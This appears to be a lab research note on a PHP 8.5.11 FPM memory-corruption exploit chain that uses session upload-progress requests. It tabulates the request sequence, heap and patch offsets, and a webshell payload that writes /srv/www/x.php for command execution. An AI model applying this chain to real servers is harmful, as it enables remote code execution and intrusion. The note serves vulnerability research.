# 8.5.11 FPM 128M pure-HTTP gdb-free chain

Lab-only research note. This is the curated release copy of the main research
log (`docs/106`); the live containers, scripts and full logs stay in the main
workspace. Authorized lab targets only; see `ACCEPTABLE_USE.md` and
`SECURITY.md`.

## Result

PHP 8.5.11 FPM, `memory_limit=128M`, single static worker,
`session.upload_progress.cleanup=Off`, nginx `client_max_body_size=0`:
the chunk-relative stale-`BG(unserialize)` chain runs end-to-end over HTTP
with **no debugger attach in the stage path**.

- in-run `ROUNDS=3` single invocation: **PASS=3/3**, every round `ASSERT OK`;
- `/srv/www/x.php` = **392 B**; host-side `GET /x.php?0=id` =
  `upload_progress_uid=33(www-data)`;
- `NO-GDB CHECK rounds=3 gdb_hits=0` is **measured**, not declared: a
  host-level sampler every 0.2 s counts `pgrep -x gdb` processes scoped to the
  container cgroup plus php-fpm `/proc/<pid>/status` entries with
  `TracerPid!=0`. `STAGE=selftest` attaches gdb on purpose and reports hits=8,
  proving the sampler can see a debugger;
- matrix `fpm-8511-http-1w` (`proof`, `oracle=http`, runner `fpm8511http`):
  3 independent runs PASS **86.4 / 88.5 / 87.5 s**.

gdb is used only for a one-off calibration (prime plane, `BG level`, offsets,
carrier floor). The stage rounds themselves are HTTP-only: the prime session
is produced by HTTP grow, and every victim session byte is written by
R1/R2a/R3 requests. No `docker exec` session writes in the chain.

## Chain

Fixed sequence, one round = `docker restart` + wait for `/plain.php` 200 +
`rm sess_SR sess_SP /srv/www/x.php`. SIDs are fixed (SP `acdbeef0...`,
SR `ccccdddd...`) so per-round cleanup is deterministic.

| # | Request | HTTP | Judge / artifact |
|---:|---|---:|---|
| 0 | restart + wait + clean sessions and `x.php` | - | cold heap, clean proof |
| 1 | R1(code): multipart `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` + file `f` | 200 | progress record created |
| 2 | prime: restart -> HTTP grow SP -> restart -> `GET /_r41prime2.php?mb=114&pad=64` | 500 | OOM fatal, child PID unchanged, `BG level=1` (calibrated once) |
| 3 | R2a(code): 8 lifters + BIG `S=0x97000` patched, progress key = code | 502 (expected) | `sess_SR` = **47 B**: `upload_progress_<?php system...>\|i:0;` scalarized |
| 4 | R1(K2): same R1 shape, progress key `K2` | 200 | second progress record |
| 5 | prime (repeat of 2) | 500 | same plane |
| 6 | R2a(K2): same carrier/aim, key `K2` | 502 (expected) | `sess_SR` = **70 B**: two scalar records (R3 victim) |
| 7 | prime (repeat of 2) | 500 | same plane |
| 8 | R3: same carrier, aim_writer = -109505, patch `DT+0x30=15` / `DT+0x38=/srv/www/x.php\0` | 200 | `/srv/www/x.php` 392 B, judge `uid=33` |

The R2a 502 is expected: the judge is the session bytes, not the HTTP code.
The prime 500 is an OOM; the php-fpm child PID must not change.

## Geometry and constants

All values are chunk-relative (main 2MB chunk). Prime plane (pad=64):

```text
d        = chunk + 0x110000   # php_unserialize_data (0x2018)
E        = chunk + 0x12C000   # d->last, overflow var_entries (push > 1018)
DT       = chunk + 0x113000   # = d + 0x3000 (first_dtor/last_dtor block)
progress = chunk + 0x62000    # PS(rfc1867_progress) = PSG + 0x188
ps_files = chunk + 0x56208    # R3 writer target
```

- 8.5.11 `php_session_rfc1867_progress` is 8 bytes shorter than 8.4.26
  (`size_t sname_len` removed), so the data-zval offsets move by -8:
  R2a (scalar) target is `progress+0x50`; 8.4.26 uses `progress+0x58`.
- Carrier floor `F` is **body-shape and plane dependent**. For this stage body
  (8 lifters of 0xE00 + BIG `S=0x97000`) the tagged measurement is
  `F=0x79000`, `S=d-F=0x97000`, `raw=[0x79000,0x110000]` (stops exactly at
  `d`), and `copy1=d+0x1018`. Historical `F0=0x72000` / `F0=0x63000` are
  readings from other prime planes and must not be reused. zendkit M24
  (`rfc1867 --shape-floor`) refuses unknown shapes instead of extrapolating.
- aim values: R2a `-103416 (-0x193F8)` -> `progress+0x50`;
  R3 writer `-109505` -> `ps_files+0` (last_key); push#2 writes
  `ps_files+8` (basedir). The fake `zend_string` is `DT+0x30`/`DT+0x38`.

Patch offsets are BIG-relative and identical for both profiles:

| Target | Offset | Value |
|---|---:|---|
| `DT[0]` | 0x1FE8 | 0 |
| `DT+0x10..+0x20` | 0x1FF8 | 0 (16 B) |
| `DT+0x20..+0x30` | 0x2008 | 0 (16 B) |
| `DT+0x30` | 0x2018 | 15 (length incl. NUL) |
| `DT+0x38` | 0x2020 | `/srv/www/x.php\0` (exact 15 B slice) |
| `E[0]` | 0x1AFE8 | R2a aim / R3 aim_writer |

The carrier builder must assert the final value length equals `S`; a shorter
slice (e.g. 2 B shorter) moves `roundup(S+1)` and lands the copy header inside
`d`, which breaks the patch (see the main log's root-cause section).

## Prime and HTTP grow

- HTTP grow for SID SP: 7 records x (8 B key + 20 file fields) + 1 record
  (7 MB key + 20 file fields), same SID; all 8 requests 200;
  `sess_SP = 7,050,470 B`. No container-side session write.
- prime: `restart -> grow SP -> restart (cold heap) -> GET
  /_r41prime2.php?mb=114&pad=64` -> 500, php-fpm log shows an OOM fatal,
  child PID unchanged, `BG level=1` (calibrated once with gdb).
- The prime page is a lab diagnostic page (documented precondition). It keeps
  `pad` live 4080 B strings + one `mb` MiB string alive and then calls
  `session_start()`; it is shipped as `labs/fpm/www/_r41prime2.php` and the
  runner installs it into the container when missing.

## Matrix

`Case("fpm-8511-http-1w", "proof", 19113, "p2s-fpm8511-128", limits="128",
proof="/srv/www/x.php", runner="fpm8511http", oracle="http")`.

After the 8.2.34 port (`docs/research/fpm-8234-port.md`) the lab matrix is
**57 cases = 49 proof + 2 refuse + 6 gap; 21/57 are `oracle=http`**.
Scoring: docs/87 v42 A 87.55 / B 85.05.

## Limitations

- lab prime diagnostic page, not a stock application page, and
  `session.upload_progress.cleanup=Off` (stock default is On; unverified);
- `docker restart` + session/`x.php` cleanup between rounds: not stateless;
- geometry constants are one-off gdb calibrated; the measured sampler covers
  the gdb-free stage path only;
- carrier floor `F` is per shape/plane; any body change invalidates constants
  and requires re-calibration;
- stock `cleanup=On` targets and stock application pages are not verified.

## Reproduction

```bash
# 8.5.11 lab (container p2s-fpm8511-128, host port 19113)
ROUNDS=3 bash labs/fpm/r41_http_chain.sh --clean          # expect PASS=3/3
STAGE=selftest bash labs/fpm/r41_http_chain.sh            # sampler negative control (hits>0)
python3 code/tools/verify_matrix.py --only fpm-8511-http-1w --http-only
```

See `docs/reproducibility.md` for the general lab/oracle rules.

## Licensing

MIT for the original code in this repository (see `LICENSE`); lab-only use.
All code in this tree is original self-implemented p2s work (MIT).
